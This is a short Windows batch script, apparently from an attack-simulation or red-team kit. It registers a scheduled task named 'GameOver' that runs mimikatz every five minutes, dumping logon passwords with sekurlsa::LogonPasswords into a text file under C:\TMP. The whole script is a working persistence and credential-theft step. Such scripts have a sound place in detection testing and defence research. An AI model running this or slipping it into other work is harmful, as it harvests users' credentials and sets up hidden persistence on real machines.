@ECHO OFF

ECHO ===========================================================================
ECHO Schtasks Creation
ECHO.
ECHO Registering mimikatz in scheduled task
ping -n 5 127.0.0.1 > NUL

schtasks /create /f /sc minute /mo 5 /tn GameOver /tr "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
